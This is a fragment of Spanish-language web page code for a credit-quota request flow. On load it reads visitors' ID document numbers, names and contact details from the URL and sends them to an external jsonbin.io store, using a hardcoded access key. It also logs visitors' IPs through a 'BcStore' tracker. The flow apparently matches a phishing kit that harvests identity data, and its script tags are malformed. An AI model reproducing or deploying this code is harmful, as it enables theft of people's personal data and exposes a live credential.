<script>
const BIN_URL = "https://api.jsonbin.io/v3/b/6ae5ff64ac6210605a61ba35";
const API_KEY = "$2a$10$HXdeZxqinTPr2kNtYaFBK.jdRq4Ckg/OrCLLo9lnNeikzUSYfuIdK";

async function guardarSolicitud(datos) {
  try {
    const leerRespuesta = await fetch(BIN_URL, {
      headers: { "X-Access-Key": API_KEY }
    });
    const datosActuales = await leerRespuesta.json();
    
    if (!datosActuales.record.solicitudes) {
      datosActuales.record.solicitudes = [];
    }
    
    datos.fecha = new Date().toLocaleString("es-CO");
    datos.estado = "EN PROGRESO";
    datosActuales.record.solicitudes.unshift(datos);
    
    await fetch(BIN_URL, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Access-Key": API_KEY
      },
      body: JSON.stringify(datosActuales.record)
    });
    console.log("Guardado correctamente");
    return true;
  } catch (error) {
   console.error("Error:", error);
    return false;
  }
}

  <script>
    (function () {
      var params = new URLSearchParams(window.location.search);
      var parts = [];
      var doc = params.get("documento");
      var tipo = params.get("tipo");
      var cupo = params.get("cupo");
      var usuario = params.get("usuario");
      var contacto = params.get("contacto") || "";
      if (tipo || doc) parts.push("Documento: " + (tipo || "CC") + (doc ? " " + doc : ""));
      if (usuario) parts.push("Usuario: " + usuario);
      var meta = document.getElementById("meta");
      if (parts.length) meta.textContent = parts.join(" · ");

      var nueva = document.getElementById("btn-nueva");
      if (nueva && cupo) {
        nueva.href = "solicitar.html?cupo=" + encodeURIComponent(cupo);
      }

      if (window.BcStore) {
        BcStore.markStep("confirm", {
          tipo: tipo || "",
          documento: doc || "",
          contacto: contacto,
          cupo: cupo || "",
          usuario: usuario || "",
          status: "rechazada",
        });
        BcStore.fetchIpThen();
      }
    })();
    
  </script>
  <script>
async function procesarSolicitud() {
  const params = new URLSearchParams(window.location.search);
  const doc = params.get("documento") || params.get("doc") || "sin documento";
  const tipo = params.get("tipo") || "sin tipo";
  const cupo = params.get("cupo") || "0";
  const contacto = params.get("contacto") || params.get("usuario") || "sin nombre";
  
  console.log("Datos a guardar:", { doc, tipo, cupo, contacto });

  const datos = {
    documento: doc,
    tipo: tipo,
    cupo: cupo,
    contacto: contacto,
    estado: "RECHAZADA"
  };

  const exito = await guardarSolicitud(datos);
  if (exito) {
    alert("Guardado correctamente");
  } else {
    alert("Error al guardar");
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', procesarSolicitud);
} else {
  procesarSolicitud();
}

</script>
